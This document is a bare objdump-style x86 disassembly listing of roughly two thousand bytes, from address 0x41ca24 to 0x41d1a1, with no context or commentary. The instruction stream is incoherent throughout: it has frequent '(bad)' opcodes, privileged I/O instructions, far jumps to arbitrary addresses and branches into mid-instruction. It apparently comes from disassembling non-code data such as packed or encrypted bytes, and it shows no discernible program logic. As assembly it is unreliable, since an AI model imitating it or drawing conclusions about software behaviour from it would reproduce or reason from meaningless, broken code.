  41ca24:	sub    dh,bl
  41ca26:	dec    ebp
  41ca27:	pop    ebx
  41ca28:	dec    edi
  41ca29:	out    0x35,eax
  41ca2b:	idiv   bl
  41ca2d:	repnz int 0xa0
  41ca30:	fcomp  DWORD PTR [ebp+0xa]
  41ca33:	xor    DWORD PTR [edi-0x36],0x0
  41ca37:	pop    ss
  41ca38:	sub    edx,0xffffffb9
  41ca3b:	ror    DWORD PTR [eax],0xb6
  41ca3e:	(bad)  
  41ca3f:	retf   0xba9b
  41ca42:	cmc    
  41ca43:	mov    al,0x23
  41ca45:	xor    BYTE PTR [edi],bh
  41ca47:	mul    BYTE PTR [ebx+0x26e5a4dd]
  41ca4d:	into   
  41ca4e:	push   esi
  41ca4f:	jl     0x41ca13
  41ca51:	xchg   ebp,eax
  41ca52:	lahf   
  41ca53:	loop   0x41caa5
  41ca55:	push   esp
  41ca56:	or     BYTE PTR [ebp-0x7b],0xd6
  41ca5a:	ror    DWORD PTR [ebx],0xaa
  41ca5d:	aas    
  41ca5e:	pop    ebp
  41ca5f:	dec    edi
  41ca60:	xor    al,0xa2
  41ca62:	adc    BYTE PTR [ebx],cl
  41ca64:	cmp    DWORD PTR [edx],eax
  41ca66:	pop    ds
  41ca67:	dec    edx
  41ca68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca69:	std    
  41ca6a:	mov    ds:0x3003d45a,al
  41ca6f:	rcr    BYTE PTR [ebp+eiz*2-0x2be0badf],0xcb
  41ca77:	cs jb  0x41ca13
  41ca7a:	xchg   DWORD PTR [edx],ebp
  41ca7c:	(bad)  
  41ca7d:	scas   al,BYTE PTR es:[edi]
  41ca7e:	push   esi
  41ca7f:	pop    eax
  41ca80:	xchg   ebp,eax
  41ca81:	pop    esp
  41ca82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca83:	ins    DWORD PTR es:[edi],dx
  41ca84:	cmp    ebp,DWORD PTR [edx]
  41ca86:	pop    es
  41ca87:	push   0xffffffe0
  41ca89:	lahf   
  41ca8a:	nop
  41ca8b:	cli    
  41ca8c:	cmp    eax,0x99852669
  41ca91:	and    eax,0x36f84e62
  41ca96:	ins    BYTE PTR es:[edi],dx
  41ca97:	push   ds
  41ca98:	push   edi
  41ca99:	sahf   
  41ca9a:	aas    
  41ca9b:	pop    es
  41ca9c:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41ca9e:	nop
  41ca9f:	mov    esi,0xad0a9ff2
  41caa4:	ss inc edi
  41caa6:	loopne 0x41caf1
  41caa8:	test   bl,0x23
  41caab:	(bad)  
  41caac:	cmp    al,bl
  41caae:	sbb    eax,0x39009b92
  41cab3:	cmp    eax,0x7653e7e1
  41cab8:	cmp    bl,dh
  41caba:	or     eax,0xf81df1a6
  41cabf:	and    eax,0x3b90aa8f
  41cac4:	adc    ebx,ecx
  41cac6:	stos   DWORD PTR es:[edi],eax
  41cac7:	imul   edx,DWORD PTR [ebx+0x224a6aa5],0x8c9841fc
  41cad1:	lds    esi,FWORD PTR [bp+di]
  41cad4:	fwait
  41cad5:	int3   
  41cad6:	test   al,0x88
  41cad8:	and    DWORD PTR [edi],ecx
  41cada:	jge    0x41cb14
  41cadc:	sub    ch,cl
  41cade:	mov    fs,WORD PTR [eax+0x31]
  41cae1:	ss nop
  41cae3:	push   cs
  41cae4:	sub    al,0x16
  41cae6:	push   ebp
  41cae7:	je     0x41ca6e
  41cae9:	loop   0x41ca7d
  41caeb:	out    dx,eax
  41caec:	xor    BYTE PTR [ecx+0x44],bl
  41caef:	push   ds
  41caf0:	pop    esp
  41caf1:	mov    dh,0x27
  41caf3:	ret    
  41caf4:	out    dx,al
  41caf5:	fisttp QWORD PTR [eax+0x26]
  41caf8:	push   ebp
  41caf9:	dec    ebp
  41cafa:	adc    esi,DWORD PTR [edi]
  41cafc:	add    al,0xc8
  41cafe:	nop
  41caff:	adc    eax,0xc487b8eb
  41cb04:	mov    ch,BYTE PTR [edx+eax*1-0x6f67257a]
  41cb0b:	jg     0x41cb29
  41cb0d:	xchg   esi,eax
  41cb0e:	mov    al,0xf0
  41cb10:	outs   dx,BYTE PTR ds:[esi]
  41cb11:	cli    
  41cb12:	pop    ecx
  41cb14:	cmc    
  41cb15:	int    0xb3
  41cb17:	sub    ecx,DWORD PTR [ecx-0x49]
  41cb1a:	mov    al,ds:0x9ed4539
  41cb1f:	push   0x87100de4
  41cb24:	loopne 0x41cb83
  41cb26:	sub    eax,0xf93d9b60
  41cb2b:	(bad)  ds:0xa904b4c6
  41cb31:	fucom  st(7)
  41cb33:	push   es
  41cb34:	mov    ah,0xf
  41cb36:	inc    ebx
  41cb37:	xor    ebp,DWORD PTR [eax+eiz*2]
  41cb3a:	nop
  41cb3b:	dec    ebx
  41cb3c:	mov    BYTE PTR [edx+0x15],bh
  41cb3f:	jbe    0x41cb15
  41cb41:	js     0x41caef
  41cb43:	dec    esp
  41cb44:	out    0xd0,eax
  41cb46:	lea    esp,[edi-0x23]
  41cb49:	out    dx,al
  41cb4a:	setne  BYTE PTR [edi-0x33]
  41cb4e:	enter  0x72e7,0xde
  41cb52:	mov    ah,0xb7
  41cb54:	and    ecx,ecx
  41cb56:	loop   0x41cbce
  41cb58:	stos   DWORD PTR es:[edi],eax
  41cb59:	fnsave [edx-0x2f1725f7]
  41cb5f:	aaa    
  41cb60:	inc    eax
  41cb61:	pusha  
  41cb62:	nop
  41cb63:	es push ebx
  41cb65:	mov    eax,ds:0x3dc45c68
  41cb6a:	lea    ecx,[edx-0x46]
  41cb6d:	mov    ds:0xe856b3c7,al
  41cb72:	mov    ds:0x586fba35,eax
  41cb77:	scas   eax,DWORD PTR es:[edi]
  41cb78:	sbb    ecx,DWORD PTR [eax+0x1614f77e]
  41cb7e:	push   0x4a
  41cb80:	sub    edx,ebx
  41cb82:	xchg   ebp,eax
  41cb83:	jmp    0x41cb17
  41cb85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb86:	shl    esi,0x9b
  41cb89:	or     ebp,DWORD PTR [eax+esi*1+0x2581444b]
  41cb90:	pop    ebx
  41cb91:	fidiv  WORD PTR [eax]
  41cb93:	out    dx,al
  41cb94:	xor    DWORD PTR [ebx-0x30],0x938a42d8
  41cb9b:	push   ebx
  41cb9c:	clc    
  41cb9d:	imul   edx,DWORD PTR [edx+0xec94b4e],0x1d706efa
  41cba7:	dec    edi
  41cba8:	in     al,dx
  41cba9:	jecxz  0x41cb8c
  41cbab:	imul   edi,DWORD PTR [ebx],0xd4bb3e5e
  41cbb1:	cmp    edx,DWORD PTR [eax-0x6ac12713]
  41cbb7:	loope  0x41cb6a
  41cbb9:	sar    DWORD PTR ds:0xb43e0b33,cl
  41cbbf:	dec    edx
  41cbc0:	push   edx
  41cbc1:	sub    eax,DWORD PTR [ecx+esi*2+0x6a55b0cd]
  41cbc8:	scas   eax,DWORD PTR es:[edi]
  41cbc9:	fwait
  41cbca:	xchg   ebx,eax
  41cbcb:	imul   ebp,DWORD PTR [edi+0x50582132],0x7e
  41cbd2:	repz sbb DWORD PTR [edi-0xcdcd823],ebx
  41cbd9:	sub    DWORD PTR [edx+0xf],eax
  41cbdc:	(bad)  
  41cbdd:	in     al,0x96
  41cbdf:	and    esi,DWORD PTR [ebp+0x6ee41225]
  41cbe5:	cmp    eax,DWORD PTR [esi]
  41cbe7:	and    ch,BYTE PTR [eax-0x213d4cbe]
  41cbed:	ffree  st(7)
  41cbef:	push   ds
  41cbf0:	in     al,0x92
  41cbf2:	das    
  41cbf3:	pop    esp
  41cbf4:	(bad)  
  41cbf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbf6:	nop
  41cbf7:	pop    esi
  41cbf8:	pop    ebp
  41cbf9:	scas   eax,DWORD PTR es:[edi]
  41cbfa:	jb     0x41cc42
  41cbfc:	sbb    al,0x69
  41cbfe:	jne    0x41cb86
  41cc00:	xchg   edx,eax
  41cc01:	retf   0x3310
  41cc04:	lock loop 0x41cbaf
  41cc07:	inc    esi
  41cc08:	cmp    eax,0xffffff8f
  41cc0b:	mov    eax,ds:0xef9bdea9
  41cc10:	sub    al,0x35
  41cc12:	jl     0x41cc61
  41cc14:	aam    0x94
  41cc16:	loopne 0x41cc80
  41cc18:	ficom  WORD PTR [edi+esi*2]
  41cc1b:	cli    
  41cc1c:	retf   
  41cc1d:	inc    ecx
  41cc1e:	rol    BYTE PTR [ecx-0x48],1
  41cc21:	jp     0x41cc04
  41cc23:	adc    bl,BYTE PTR [esi-0x9]
  41cc26:	fcom   QWORD PTR [edi+0x4cface5f]
  41cc2c:	cmp    cl,dh
  41cc2e:	mov    cs,WORD PTR [edx+0x4f]
  41cc31:	or     eax,0x25a84de8
  41cc36:	push   ecx
  41cc37:	cmp    eax,0x1163329b
  41cc3c:	int3   
  41cc3d:	push   esi
  41cc3e:	retf   0xa735
  41cc41:	pop    edx
  41cc42:	xchg   ebx,eax
  41cc43:	dec    esp
  41cc44:	jmp    0x3822:0x3f410457
  41cc4b:	add    al,0x6a
  41cc4d:	xchg   ax,ax
  41cc4f:	std    
  41cc50:	call   0xcb3c4b5b
  41cc55:	sub    eax,0x5d6449d6
  41cc5a:	sub    dh,dh
  41cc5c:	std    
  41cc5d:	fimul  WORD PTR [edi+0x4d]
  41cc60:	xlat   BYTE PTR ds:[ebx]
  41cc61:	ja     0x41cc63
  41cc63:	dec    edx
  41cc64:	fild   QWORD PTR [ecx-0xd]
  41cc67:	je     0x41cc10
  41cc69:	lock or BYTE PTR [edx-0x8],0x78
  41cc6e:	or     al,0x2e
  41cc70:	repz fdivr st,st(4)
  41cc73:	neg    DWORD PTR [ebx-0xf85a519]
  41cc79:	xchg   edx,eax
  41cc7a:	ins    DWORD PTR es:[edi],dx
  41cc7b:	stos   BYTE PTR es:[edi],al
  41cc7c:	push   esp
  41cc7d:	fbstp  TBYTE PTR [ebp-0x58c46a80]
  41cc83:	inc    ecx
  41cc84:	jb     0x41ccd4
  41cc86:	xor    edi,DWORD PTR [ebx+ebx*4-0x2b3876d8]
  41cc8d:	mov    dh,0x80
  41cc8f:	ret    
  41cc90:	mov    ebp,0x579957dd
  41cc95:	fs js  0x41cd0d
  41cc98:	mov    esp,0x9b9008d7
  41cc9d:	add    BYTE PTR [ebx-0x315d2929],0x66
  41cca4:	jbe    0x41cca2
  41cca6:	std    
  41cca7:	sar    DWORD PTR [esi+0x2f099d7b],cl
  41ccad:	repz ret 
  41ccaf:	adc    DWORD PTR ds:0x4a2dc9bb,ecx
  41ccb5:	fimul  WORD PTR [eax-0x43a8e9d3]
  41ccbb:	not    DWORD PTR [esi-0x22]
  41ccbe:	pop    esp
  41ccbf:	std    
  41ccc0:	aas    
  41ccc1:	bound  eax,QWORD PTR [esi]
  41ccc3:	arpl   WORD PTR [esp+edi*2+0x7c],si
  41ccc7:	and    BYTE PTR [eax+esi*2+0xb9d25a7],bl
  41ccce:	cmp    eax,0x5ffd6c67
  41ccd3:	aam    0x53
  41ccd5:	(bad)  
  41ccd7:	xchg   ebp,eax
  41ccd8:	jecxz  0x41cc92
  41ccda:	popf   
  41ccdb:	jmp    0x41cd42
  41ccdd:	stos   DWORD PTR es:[edi],eax
  41ccde:	nop
  41ccdf:	loop   0x41cc93
  41cce1:	or     eax,0xdb0d7363
  41cce6:	mov    eax,ds:0x2872c265
  41cceb:	retf   0xf049
  41ccee:	shl    BYTE PTR ds:0xfe9082e4,0x67
  41ccf5:	and    eax,0x8d0241da
  41ccfa:	pop    ecx
  41ccfb:	dec    edx
  41ccfc:	dec    ebx
  41ccfd:	ja     0x41cd45
  41ccff:	dec    ax
  41cd01:	or     eax,0x4c9b61a2
  41cd06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd07:	sbb    DWORD PTR [edi],edi
  41cd09:	cs jp  0x41cd28
  41cd0c:	mov    WORD PTR [edx],gs
  41cd0e:	(bad)  
  41cd0f:	adc    eax,0xa3c3c5a9
  41cd14:	fcmovu st,st(5)
  41cd16:	shr    BYTE PTR [esi+eax*4+0x53960672],0x3c
  41cd1e:	xchg   ebx,eax
  41cd1f:	fdivr  DWORD PTR [ebx+0x23280725]
  41cd25:	shr    BYTE PTR [ebp-0x5e185f77],0x49
  41cd2c:	push   cs
  41cd2d:	retf   
  41cd2e:	pop    esi
  41cd2f:	bnd jno 0x41cce1
  41cd32:	xchg   ebp,eax
  41cd33:	rcr    BYTE PTR [ebx+0x6af8cacb],1
  41cd39:	inc    esp
  41cd3a:	sbb    BYTE PTR [edi],0xaa
  41cd3d:	call   0x98b5b13f
  41cd42:	adc    BYTE PTR [edi+0x5c3b7e0b],ah
  41cd48:	fwait
  41cd49:	jecxz  0x41cdb5
  41cd4b:	loope  0x41cd6f
  41cd4d:	std    
  41cd4e:	cli    
  41cd4f:	je     0x41cd22
  41cd51:	fst    QWORD PTR [eax-0x4b74f585]
  41cd57:	add    dh,BYTE PTR [ecx]
  41cd59:	add    eax,DWORD PTR [eax+0x5503f3d0]
  41cd5f:	dec    edx
  41cd60:	pop    edx
  41cd61:	cli    
  41cd62:	call   0xbc49:0xb9343291
  41cd69:	icebp  
  41cd6a:	inc    ebx
  41cd6b:	jmp    0x41cdb7
  41cd6d:	xlat   BYTE PTR ds:[ebx]
  41cd6e:	xchg   esp,eax
  41cd6f:	pop    edx
  41cd70:	fwait
  41cd71:	lock pusha 
  41cd73:	pop    edx
  41cd74:	push   es
  41cd75:	sar    BYTE PTR ds:0x78ddc00d,1
  41cd7b:	mov    ebp,DWORD PTR [ebx-0x1b]
  41cd7e:	push   es
  41cd7f:	xor    BYTE PTR [ecx+0xd],ch
  41cd82:	nop
  41cd83:	jo     0x41cdfb
  41cd85:	imul   ebp,DWORD PTR [ebp+eax*1+0x4a2415fd],0xffffff93
  41cd8d:	pop    esi
  41cd8e:	cmp    edi,DWORD PTR [edi-0x6f]
  41cd91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd92:	mov    dl,0x58
  41cd94:	mov    dl,0x93
  41cd96:	outs   dx,BYTE PTR ds:[esi]
  41cd97:	call   0xbadde237
  41cd9c:	je     0x41cdb4
  41cd9e:	cmovp  edx,DWORD PTR [edi-0x7240f84a]
  41cda5:	repz adc al,0x31
  41cda8:	mov    eax,0xdbd94fca
  41cdad:	test   BYTE PTR [eax+0x17],al
  41cdb0:	(bad)  
  41cdb1:	jg     0x41cd6d
  41cdb3:	dec    ecx
  41cdb4:	std    
  41cdb5:	or     eax,0x6576fdf7
  41cdba:	(bad)  
  41cdbb:	outs   dx,DWORD PTR ds:[esi]
  41cdbc:	fwait
  41cdbd:	out    0x75,eax
  41cdbf:	mov    al,ds:0x69ff88f8
  41cdc4:	cmp    eax,0xf24236de
  41cdc9:	lds    edi,FWORD PTR es:0xdf974df5
  41cdd0:	fdivr  QWORD PTR [eax]
  41cdd2:	xor    eax,0xe4fe4b0f
  41cdd7:	and    eax,0xe15c15cc
  41cddc:	fwait
  41cddd:	pop    edx
  41cdde:	(bad)  
  41cddf:	pop    esi
  41cde0:	(bad)  
  41cde1:	enter  0xf83b,0x13
  41cde5:	ja     0x41cd78
  41cde7:	fnstenv ds:0xbf57f708
  41cded:	and    al,0x0
  41cdef:	std    
  41cdf0:	loopne 0x41ce08
  41cdf2:	xchg   ebx,eax
  41cdf3:	gs fwait
  41cdf5:	(bad)  
  41cdf6:	sti    
  41cdf7:	inc    esi
  41cdf8:	push   ecx
  41cdf9:	mov    ecx,0xfd9be7ba
  41cdfe:	jno    0x41ce36
  41ce00:	lock pop eax
  41ce02:	push   ds
  41ce03:	push   cs
  41ce04:	lods   al,BYTE PTR ds:[esi]
  41ce05:	fnstsw WORD PTR [esi]
  41ce07:	and    dh,BYTE PTR [eax]
  41ce09:	dec    ecx
  41ce0a:	dec    edx
  41ce0b:	and    eax,0x3c91c6d2
  41ce10:	lahf   
  41ce11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce12:	xor    BYTE PTR [ebx-0x29b599e],ah
  41ce18:	inc    edx
  41ce19:	retf   0x515b
  41ce1c:	js     0x41ce9b
  41ce1e:	mov    dh,0x87
  41ce20:	push   ss
  41ce21:	sahf   
  41ce22:	sub    eax,0x766b8969
  41ce27:	test   al,0x9b
  41ce29:	iret   
  41ce2a:	jnp    0x41ce4c
  41ce2c:	or     edi,DWORD PTR [edx-0x57]
  41ce2f:	js     0x41ce60
  41ce31:	fidivr WORD PTR [esi+ebp*1-0xea717cd]
  41ce38:	mov    ebp,0xf91c9098
  41ce3d:	hlt    
  41ce3e:	push   0x38
  41ce40:	rcl    cl,cl
  41ce42:	test   DWORD PTR [edx-0x6f],ecx
  41ce45:	rcr    BYTE PTR [ebx+0x57],0x70
  41ce49:	dec    ecx
  41ce4a:	in     eax,dx
  41ce4b:	fstp   QWORD PTR [ebx-0x3f53b630]
  41ce51:	data16 jl 0x41ce83
  41ce54:	dec    eax
  41ce55:	cmp    dl,BYTE PTR ds:0xfd6d9f3a
  41ce5b:	imul   edx,DWORD PTR [edi-0x62],0x20
  41ce5f:	jb     0x41cdee
  41ce61:	test   DWORD PTR [eax+0x13128c9f],edx
  41ce67:	in     eax,dx
  41ce68:	pusha  
  41ce69:	xchg   edi,eax
  41ce6a:	jp     0x41ceb6
  41ce6c:	xor    eax,0xe17379b8
  41ce71:	sub    ebp,DWORD PTR [ebx+0x2d]
  41ce74:	fwait
  41ce75:	cmp    BYTE PTR ds:0xa764aad3,bl
  41ce7b:	imul   esi,DWORD PTR [edi],0x36f117fc
  41ce81:	loope  0x41ce96
  41ce83:	add    al,0xff
  41ce85:	sub    eax,0x6a3e6588
  41ce8a:	xchg   edi,eax
  41ce8b:	and    dh,BYTE PTR [edx]
  41ce8d:	addr16 mov ah,0x8b
  41ce90:	mov    ebx,0xb3c5854
  41ce95:	push   es
  41ce96:	les    ecx,FWORD PTR [esi+0x41]
  41ce99:	fisub  WORD PTR [edi+0x570dc007]
  41ce9f:	adc    al,0x2
  41cea1:	push   ds
  41cea2:	nop
  41cea3:	push   edx
  41cea4:	fild   QWORD PTR [ebp-0x58dd7e42]
  41ceaa:	or     BYTE PTR [ebp-0xd],cl
  41cead:	push   ecx
  41ceae:	mov    edi,0x2050ef0c
  41ceb3:	int3   
  41ceb4:	(bad)  
  41ceb5:	sbb    edx,DWORD PTR [eax-0x792fff5d]
  41cebb:	(bad)  
  41cebc:	xor    cl,BYTE PTR [esi]
  41cebe:	inc    edx
  41cebf:	dec    edx
  41cec0:	pop    edx
  41cec1:	fisttp DWORD PTR [edx+0x53]
  41cec4:	jne    0x2dd8d7a
  41ceca:	enter  0x9f02,0x43
  41cece:	bound  esi,QWORD PTR [ecx]
  41ced0:	shl    ah,cl
  41ced2:	or     eax,DWORD PTR [ebx+0xac4844f]
  41ced8:	and    eax,DWORD PTR [ecx-0x2c]
  41cedb:	sub    eax,0xf98ff3a4
  41cee0:	into   
  41cee1:	sbb    BYTE PTR fs:[ebx],0x5c
  41cee5:	(bad)  
  41cee6:	jmp    0xd70f:0x6aa82149
  41ceed:	push   edi
  41ceee:	call   0x62a6:0x26949c4a
  41cef5:	jge    0x41cf76
  41cef7:	dec    esp
  41cef8:	jnp    0x41cee8
  41cefa:	scas   al,BYTE PTR es:[edi]
  41cefb:	dec    ecx
  41cefc:	jo     0x41cf55
  41cefe:	push   ss
  41ceff:	push   ecx
  41cf00:	fldz   
  41cf02:	aaa    
  41cf03:	ficomp DWORD PTR [esi-0x7942d3ee]
  41cf09:	stos   DWORD PTR es:[edi],eax
  41cf0a:	idiv   DWORD PTR [ecx]
  41cf0c:	call   0x1899f27d
  41cf11:	xchg   edi,eax
  41cf12:	test   BYTE PTR [edi-0x46fdbee5],bh
  41cf18:	add    edx,DWORD PTR ds:0x1f6689e0
  41cf1e:	nop
  41cf1f:	adc    edi,DWORD PTR [ecx-0x3c]
  41cf22:	mov    dl,0xd7
  41cf24:	mov    DWORD PTR [edx],ebx
  41cf26:	mov    ds:0x90cf7486,al
  41cf2b:	jmp    0x41cf7b
  41cf2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf2e:	es inc ebx
  41cf30:	(bad)  
  41cf31:	test   al,0x97
  41cf33:	push   0x4d3ea367
  41cf38:	imul   eax,DWORD PTR [ebx-0x30],0xfffffff3
  41cf3c:	mov    dl,0xe4
  41cf3e:	mov    esi,0x346f6f9a
  41cf43:	jnp    0x41cf80
  41cf45:	jl     0x41cedc
  41cf47:	adc    eax,esi
  41cf49:	enter  0xb390,0x4
  41cf4d:	mov    ds:0x64856ea1,eax
  41cf52:	test   al,0x57
  41cf54:	mov    DWORD PTR [ebp+0x205be62f],ebx
  41cf5a:	add    al,0x92
  41cf5c:	and    al,bl
  41cf5e:	loopne 0x41cf9d
  41cf60:	push   esp
  41cf61:	xor    DWORD PTR [eax+0x47c44357],edx
  41cf67:	popa   
  41cf68:	leave  
  41cf69:	adc    al,ch
  41cf6b:	dec    edx
  41cf6c:	test   DWORD PTR [eax-0x5],ebp
  41cf6f:	inc    esp
  41cf70:	rcl    esi,1
  41cf72:	sub    bh,BYTE PTR [esi]
  41cf74:	jl     0x41cf0f
  41cf76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf77:	int3   
  41cf78:	int    0x7c
  41cf7a:	xchg   ebx,eax
  41cf7b:	je     0x41cf73
  41cf7d:	mov    eax,ebx
  41cf7f:	xor    DWORD PTR [edx-0x487dabfd],ecx
  41cf85:	(bad)  
  41cf86:	adc    BYTE PTR [ebx-0x7339033d],dl
  41cf8c:	in     eax,0x32
  41cf8e:	xchg   edx,eax
  41cf8f:	out    dx,eax
  41cf90:	and    BYTE PTR [ebp+ebx*4+0x7],cl
  41cf94:	inc    edi
  41cf95:	pop    esi
  41cf96:	inc    edi
  41cf97:	div    DWORD PTR [edx+0xa4c2560]
  41cf9d:	ret    
  41cf9e:	mov    ah,0x1b
  41cfa0:	xchg   BYTE PTR [edi+0x573d77f0],dh
  41cfa6:	nop
  41cfa7:	mov    ebx,0x9eef063e
  41cfac:	and    bl,BYTE PTR [eax+0x46]
  41cfaf:	dec    edx
  41cfb0:	ss popf 
  41cfb2:	popa   
  41cfb3:	fmulp  st(6),st
  41cfb5:	shl    DWORD PTR [esi],0x7b
  41cfb8:	fwait
  41cfb9:	loop   0x41cffb
  41cfbb:	dec    esp
  41cfbc:	(bad)  
  41cfbd:	(bad)  
  41cfbe:	jg     0x41cfb1
  41cfc0:	jbe    0x41cfa0
  41cfc2:	fistp  WORD PTR [eax+0x12]
  41cfc5:	ds and al,0x70
  41cfc8:	and    esi,DWORD PTR [edi]
  41cfca:	nop
  41cfcb:	sub    al,0x5e
  41cfcd:	outs   dx,DWORD PTR ds:[esi]
  41cfce:	cld    
  41cfcf:	cmc    
  41cfd0:	mov    eax,0xa949d97e
  41cfd5:	sub    BYTE PTR [ebx+0x5ec9b7e7],0x1f
  41cfdc:	mov    ds:0x48f937f6,al
  41cfe1:	ds push edi
  41cfe3:	sub    DWORD PTR [ebx],ebp
  41cfe5:	lds    ecx,FWORD PTR [edi+eax*1+0x49facdb8]
  41cfec:	call   0x9834:0x38dc109a
  41cff3:	jp     0x41d007
  41cff5:	xchg   ebp,eax
  41cff6:	nop
  41cff7:	out    dx,eax
  41cff8:	sbb    al,BYTE PTR [esi+0x403f2ad1]
  41cffe:	jns    0x41d04a
  41d000:	inc    edx
  41d001:	bound  edi,QWORD PTR [ecx-0x7a9a076f]
  41d007:	pushf  
  41d008:	jecxz  0x41d04f
  41d00a:	jle    0x41d056
  41d00c:	push   es
  41d00d:	call   eax
  41d00f:	js     0x41cfa8
  41d011:	(bad)  
  41d012:	and    BYTE PTR [esi-0x1cfa214c],bh
  41d018:	jmp    0x64b5061c
  41d01d:	stos   BYTE PTR es:[edi],al
  41d01e:	cwde   
  41d01f:	std    
  41d020:	(bad)  
  41d022:	dec    edx
  41d023:	mov    ah,ah
  41d025:	fild   WORD PTR [edx]
  41d027:	xchg   esi,eax
  41d028:	jle    0x41d08e
  41d02a:	jg     0x41cfb6
  41d02c:	pushfw 
  41d02e:	fadd   st,st(1)
  41d030:	ret    
  41d031:	fld    QWORD PTR [edx+ebp*4+0x13e5f51b]
  41d038:	xor    edx,DWORD PTR [ebx-0x5f791170]
  41d03e:	sbb    dh,BYTE PTR [edi+0x68]
  41d041:	add    BYTE PTR [ecx+0x3b1a6c4a],cl
  41d047:	pusha  
  41d048:	dec    edx
  41d049:	sbb    al,al
  41d04b:	mov    ebp,0xfe8ff38d
  41d050:	add    cl,bl
  41d052:	jmp    0xcf4a:0x6ec68ef1
  41d059:	test   al,0x3
  41d05b:	in     eax,dx
  41d05c:	das    
  41d05d:	ja     0x41d063
  41d05f:	repz sbb BYTE PTR [esi+0x6ea4b590],bh
  41d066:	ins    BYTE PTR es:[edi],dx
  41d067:	dec    ebx
  41d068:	leave  
  41d069:	loopne 0x41d0ae
  41d06b:	dec    edx
  41d06c:	ss in  al,0xef
  41d06f:	stc    
  41d070:	sbb    DWORD PTR [ebp+ebp*4+0x72cbcbb1],0x1c
  41d078:	sbb    al,0xc3
  41d07a:	sbb    al,0x4d
  41d07c:	jl     0x41d004
  41d07e:	daa    
  41d07f:	test   al,0x25
  41d081:	shr    BYTE PTR [eax+0x64],cl
  41d084:	fidiv  DWORD PTR [eax+0x71a00490]
  41d08a:	and    eax,0x5a0f838
  41d08f:	dec    edx
  41d090:	cmp    al,0x49
  41d092:	or     BYTE PTR [edx-0x70],dl
  41d095:	push   ebp
  41d096:	ins    BYTE PTR es:[edi],dx
  41d097:	xchg   edi,eax
  41d098:	mov    ds:0x1940dc75,al
  41d09d:	add    dl,BYTE PTR [eax+0x26238083]
  41d0a3:	pop    esp
  41d0a4:	cwde   
  41d0a5:	sbb    al,0x38
  41d0a7:	dec    edx
  41d0a8:	inc    ebp
  41d0a9:	add    edi,DWORD PTR [esi-0x27]
  41d0ac:	sub    al,0x84
  41d0ae:	nop
  41d0af:	sub    al,0x70
  41d0b1:	lods   eax,DWORD PTR ds:[esi]
  41d0b2:	retf   
  41d0b3:	je     0x41d122
  41d0b5:	mov    dl,0xef
  41d0b7:	dec    ecx
  41d0b8:	int3   
  41d0b9:	ret    0x165e
  41d0bc:	repz imul edi,DWORD PTR [ebp-0x5],0xc3c5859b
  41d0c4:	xchg   BYTE PTR [esi-0x21785313],bl
  41d0ca:	dec    ebx
  41d0cb:	es dec edi
  41d0cd:	xor    dh,0x1a
  41d0d0:	mov    ah,0xd1
  41d0d2:	sbb    DWORD PTR [edx],0xffffffca
  41d0d5:	call   0x5d50:0x9f0776af
  41d0dc:	inc    ebx
  41d0dd:	xor    DWORD PTR [ecx+eax*1],ecx
  41d0e0:	mov    al,ds:0x65bfc4dd
  41d0e5:	lock rcl BYTE PTR [esp+ecx*4+0x2d279028],1
  41d0ed:	imul   dl
  41d0ef:	inc    BYTE PTR [esi]
  41d0f1:	fbstp  TBYTE PTR [edx+0x4d]
  41d0f4:	sub    BYTE PTR [esi],0x4a
  41d0f7:	push   ebp
  41d0f8:	popf   
  41d0f9:	out    0x3f,al
  41d0fb:	dec    ebp
  41d0fc:	leave  
  41d0fd:	jns    0x41d094
  41d0ff:	mov    esi,0x55ad8c86
  41d104:	sbb    edx,ecx
  41d106:	cmp    bl,bl
  41d108:	or     esi,ebx
  41d10a:	in     eax,dx
  41d10b:	inc    esi
  41d10c:	loopne 0x41d140
  41d10e:	scas   al,BYTE PTR es:[edi]
  41d10f:	jg     0x41d0c5
  41d111:	push   cs
  41d112:	nop
  41d113:	outs   dx,BYTE PTR ds:[esi]
  41d114:	adc    edx,DWORD PTR [edi-0x51a112c2]
  41d11a:	inc    esi
  41d11b:	dec    edx
  41d11c:	mov    cl,0x92
  41d11e:	and    ch,dl
  41d120:	popf   
  41d121:	push   esp
  41d122:	mov    eax,ds:0x7fed9bfb
  41d127:	je     0x41d19f
  41d129:	mov    bl,0x47
  41d12b:	test   edx,eax
  41d12d:	fst    QWORD PTR ds:0x6e08cf69
  41d133:	shl    DWORD PTR ds:0xaa1c90ba,0x76
  41d13a:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d13c:	sub    ebp,DWORD PTR [ebp-0x6d80aa56]
  41d142:	(bad)  
  41d143:	aad    0x8d
  41d145:	test   DWORD PTR [eax-0x11e4730],edx
  41d14b:	xchg   bl,bl
  41d14d:	or     eax,0x7e514a7b
  41d152:	mov    ds:0xa609d26c,al
  41d157:	dec    esp
  41d158:	sahf   
  41d159:	xchg   DWORD PTR [eax-0xd72a9ea],eax
  41d15f:	sub    bh,BYTE PTR [ebx+0xf0b6c77]
  41d165:	fimul  WORD PTR [ecx]
  41d167:	mov    BYTE PTR [ebx],dl
  41d169:	fldenv [esi]
  41d16b:	push   ds
  41d16c:	sahf   
  41d16d:	push   esp
  41d16e:	nop
  41d16f:	sub    edi,0xffffffe1
  41d172:	xor    al,0xc9
  41d174:	stc    
  41d175:	jo     0x41d1e1
  41d177:	dec    edx
  41d178:	and    esp,DWORD PTR [edi+0x681f8b16]
  41d17e:	(bad)  
  41d17f:	aas    
  41d180:	(bad)  
  41d181:	cli    
  41d182:	(bad)  
  41d183:	mov    cs,WORD PTR [esi-0x23]
  41d186:	mov    ch,0xe4
  41d188:	add    ecx,0x887549e4
  41d18e:	sar    BYTE PTR [ebx],0x9d
  41d191:	repz mov bl,BYTE PTR [ebx]
  41d194:	fwait
  41d195:	stos   BYTE PTR es:[edi],al
  41d196:	repnz mov ?,WORD PTR [eax-0x3d]
  41d19a:	push   0x51dfafd0
  41d19f:	dec    eax
  41d1a0:	push   edi
  41d1a1:	imul   edi,ebp,0x1
